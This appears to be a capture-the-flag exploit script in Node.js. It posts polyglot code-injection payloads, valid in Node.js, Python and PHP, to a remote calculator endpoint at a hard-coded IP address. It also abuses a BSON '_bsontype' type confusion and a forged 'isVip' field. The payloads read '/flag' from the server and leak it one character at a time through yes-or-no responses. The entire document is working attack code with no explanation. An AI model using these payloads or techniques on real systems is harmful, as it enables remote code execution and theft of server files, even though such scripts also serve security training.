const axios = require('axios')
const url = 'http://45.77.242.16/calculate'
const symbols = '0123456789abcdefghijklmnopqrstuvwxyz{}_'.split('')

const payloads = [
	// Nodejs
	`1 + 0//5 or '''\n//?>\nrequire('fs').readFileSync('/flag','utf-8')[{index}] == '{symbol}' ? 1 : 2;/*<?php\nfunction open(){echo MongoDB\\BSON\\fromPHP(['ret' => '1']);exit;}?>*///'''`,

	// Python
	`(open('/flag').read()[{index}] == '{symbol}') + (str(1//5) == 0) or 2 or ''' #\n))//?>\nfunction open(){return {read:()=>'{flag}'}}function str(){return 0}/*<?php\nfunction open(){echo MongoDB\\BSON\\fromPHP(['ret' => '1']);exit;}?>*///'''`,

	// PHP
	`len('1') + 0//5 or '''\n//?>\n1;function len(){return 1}/*<?php\nfunction len($a){echo MongoDB\\BSON\\fromPHP(['ret' => file_get_contents('/flag')[{index}] == '{symbol}' ? "1" : "2"]);exit;}?>*///'''`,

]
const rets = []

const checkAnswer = (value) => axios.post(url, {
	expression: {
		value,
		_bsontype: "Symbol"
	},
	isVip: true
}).then(p => p.data.ret === '1').catch(e => {})

const fn = async () => {

	for (let j = 0; j < payloads.length; j++) {
		const payload = payloads[j]
		let flag = ''
		let index = 0
		while (true) {
			for (let i = 0; i < symbols.length; i++) {
				const ret = await checkAnswer(payload.replace(/\{flag\}/g, flag + symbols[i]).replace(/\{symbol\}/g, symbols[i]).replace(/\{index\}/g, index))
				if (ret) {
					flag += symbols[i]
					console.log(symbols[i])
					i = 0
					index++
				}
			}
			break
		}
		rets.push(flag)
		console.log(rets)
	}

}

fn().then(p => {
	console.log(rets.join(''))
})
